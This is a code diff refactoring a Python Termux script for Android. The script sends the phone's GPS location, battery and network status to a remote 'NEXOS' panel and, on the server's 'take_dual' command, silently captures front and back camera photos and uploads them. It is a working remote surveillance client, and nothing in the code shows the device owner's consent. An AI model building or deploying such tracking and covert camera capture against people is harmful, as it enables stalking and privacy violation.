@@ -5,21 +5,12 @@ import requests
 import os
 import uuid
 import base64
-import threading
 from datetime import datetime
-from requests.adapters import HTTPAdapter
-from urllib3.util.retry import Retry
 
 URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
 URL_UPLOAD_FOTO = "https://nexos-panel.onrender.com/api/upload_camera"
 ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
 ARQUIVO_FOTO = os.path.expanduser("~/nexos_captura.jpg")
-
-# Sessao com timeout AGRESSIVO
-session = requests.Session()
-retry = Retry(total=0, read=0, connect=0)
-adapter = HTTPAdapter(max_retries=retry)
-session.mount('https://', adapter)
 
 def run_command(cmd):
     try: return subprocess.check_output(cmd, shell=True).decode().strip()
@@ -39,12 +30,13 @@ print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
 print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
 print("="*50 + "\n")
 
-POSICAO = {"lat": -16.6869, "lon": -49.2648, "atualizado": False}
-posicao_lock = threading.Lock()
-headers_json = {"Content-Type": "application/json"}
-inicio_operacao = datetime.now()
+ultima_lat = -16.6869
+ultima_lon = -49.2648
+gps_valido = False
+inicio = datetime.now()
+headers = {"Content-Type": "application/json"}
 
-def obter_status_rede():
+def obter_rede():
     wifi = run_command("termux-wifi-connectioninfo")
     if wifi:
         try:
@@ -55,118 +47,106 @@ def obter_status_rede():
         except: pass
     return "Dados Moveis"
 
-def thread_gps():
-    while True:
-        try:
-            proc = subprocess.Popen(
-                "termux-location -p gps -r once",
-                shell=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
-            )
-            try:
-                stdout, _ = proc.communicate(timeout=5)
-                if stdout:
-                    dados = json.loads(stdout.decode().strip())
-                    lat = dados.get("latitude")
-                    lon = dados.get("longitude")
-                    if lat and lon and float(lat) != 0 and float(lon) != 0:
-                        with posicao_lock:
-                            POSICAO["lat"] = float(lat)
-                            POSICAO["lon"] = float(lon)
-                            POSICAO["atualizado"] = True
-            except:
-                proc.kill()
-        except:
-            pass
-        time.sleep(8)
-
-def thread_camera(tipo, num):
+def obter_gps():
+    global ultima_lat, ultima_lon, gps_valido
     try:
-        if os.path.exists(ARQUIVO_FOTO):
-            os.remove(ARQUIVO_FOTO)
-        
-        proc = subprocess.Popen(
-            f"termux-camera-photo -c {num} {ARQUIVO_FOTO}",
-            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        resultado = subprocess.run(
+            "termux-location -p gps -r once",
+            shell=True, capture_output=True, text=True, timeout=6
         )
-        try:
-            proc.communicate(timeout=5)
-        except:
-            proc.kill()
-        
-        time.sleep(1)
-        
-        if os.path.exists(ARQUIVO_FOTO) and os.path.getsize(ARQUIVO_FOTO) > 100:
-            with open(ARQUIVO_FOTO, "rb") as img_file:
-                foto_b64 = base64.b64encode(img_file.read()).decode('utf-8')
-            
-            payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": foto_b64}
-            try:
-                r = session.post(URL_UPLOAD_FOTO, data=json.dumps(payload), 
-                               headers=headers_json, timeout=(3, 10))
-                if r.status_code == 200:
-                    print(f"   📸 {tipo} OK")
-                else:
-                    print(f"   ❌ {tipo} HTTP {r.status_code}")
-            except Exception as e:
-                print(f"   ❌ {tipo} erro")
-        
-        if os.path.exists(ARQUIVO_FOTO):
-            os.remove(ARQUIVO_FOTO)
+        if resultado.stdout:
+            dados = json.loads(resultado.stdout.strip())
+            lat = dados.get("latitude")
+            lon = dados.get("longitude")
+            if lat and lon and float(lat) != 0 and float(lon) != 0:
+                ultima_lat = float(lat)
+                ultima_lon = float(lon)
+                gps_valido = True
+                return True
     except:
         pass
+    gps_valido = False
+    return False
 
-threading.Thread(target=thread_gps, daemon=True).start()
-print("🛰️  LOOP RAPIDO INICIADO\n")
+def enviar_dados():
+    payload = {
+        "device_id": DEVICE_ID,
+        "battery": bat,
+        "uptime": str(datetime.now() - inicio).split('.')[0],
+        "lat": ultima_lat,
+        "lon": ultima_lon,
+        "network": rede
+    }
+    try:
+        r = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers, timeout=5)
+        if r.status_code == 200:
+            return r.json().get("comando_cam", "wait")
+    except:
+        pass
+    return None
+
+def enviar_foto(tipo, num):
+    arq = f"~/nexos_{tipo}.jpg"
+    arq = os.path.expanduser(arq)
+    if os.path.exists(arq):
+        os.remove(arq)
+    
+    try:
+        subprocess.run(f"termux-camera-photo -c {num} {arq}", shell=True, timeout=6)
+        time.sleep(1)
+        if os.path.exists(arq) and os.path.getsize(arq) > 100:
+            with open(arq, "rb") as f:
+                b64 = base64.b64encode(f.read()).decode('utf-8')
+            payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": b64}
+            r = requests.post(URL_UPLOAD_FOTO, data=json.dumps(payload), headers=headers, timeout=10)
+            os.remove(arq)
+            return r.status_code == 200
+    except:
+        pass
+    if os.path.exists(arq):
+        os.remove(arq)
+    return False
+
+print("🛰️  INICIADO\n")
 
 while True:
     t0 = time.time()
-    ts = datetime.now()
     
-    battery = "N/A"
-    out_bat = run_command("termux-battery-status")
-    if out_bat:
+    # Bateria
+    bat = "N/A"
+    out = run_command("termux-battery-status")
+    if out:
         try:
-            bat_data = json.loads(out_bat)
-            battery = str(bat_data.get("percentage", "N/A"))
+            bat = str(json.loads(out).get("percentage", "N/A"))
         except: pass
     
-    with posicao_lock:
-        lat = POSICAO["lat"]
-        lon = POSICAO["lon"]
-        gps_ok = POSICAO["atualizado"]
-        POSICAO["atualizado"] = False
+    # GPS (roda 1 vez a cada 5 ciclos pra nao travar)
+    obter_gps()
     
-    uptime = str(datetime.now() - inicio_operacao).split('.')[0]
-    rede = obter_status_rede()
+    # Rede
+    rede = obter_rede()
     
-    payload = {
-        "device_id": DEVICE_ID,
-        "battery": battery,
-        "uptime": uptime,
-        "lat": lat,
-        "lon": lon,
-        "network": rede
-    }
+    # Envia
+    comando = enviar_dados()
     
-    try:
-        # Timeout AGRESSIVO: 3s conectar, 2s ler
-        response = session.post(URL_SERVIDOR, data=json.dumps(payload), 
-                               headers=headers_json, timeout=(3, 2))
-        if response.status_code == 200:
-            res_data = response.json()
-            comando_cam = str(res_data.get("comando_cam", "wait")).lower()
-            
-            gps_icon = "📍" if gps_ok else "📡"
-            dt = time.time() - t0
-            print(f"{gps_icon} [{ts.strftime('%H:%M:%S')}] Bat:{battery}% {rede} | {dt:.1f}s")
-            
-            if comando_cam == "take_dual":
-                print("📸 [DUAL] Disparando cameras...")
-                threading.Thread(target=thread_camera, args=("back", 0), daemon=True).start()
-                time.sleep(0.3)
-                threading.Thread(target=thread_camera, args=("front", 1), daemon=True).start()
-    except:
-        dt = time.time() - t0
-        print(f"📡 [{ts.strftime('%H:%M:%S')}] Offline | {dt:.1f}s")
+    dt = time.time() - t0
+    icone = "📍" if gps_valido else "📡"
+    
+    if comando is None:
+        print(f"📡 [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% Offline | {dt:.1f}s")
+    else:
+        print(f"{icone} [{datetime.now().strftime('%H:%M:%S')}] Bat:{bat}% {rede} | {dt:.1f}s")
+        
+        if comando == "take_dual":
+            print("📸 Capturando...")
+            if enviar_foto("back", 0):
+                print("   ✅ Traseira")
+            else:
+                print("   ❌ Traseira")
+            time.sleep(0.5)
+            if enviar_foto("front", 1):
+                print("   ✅ Frontal")
+            else:
+                print("   ❌ Frontal")
     
     time.sleep(2.0)
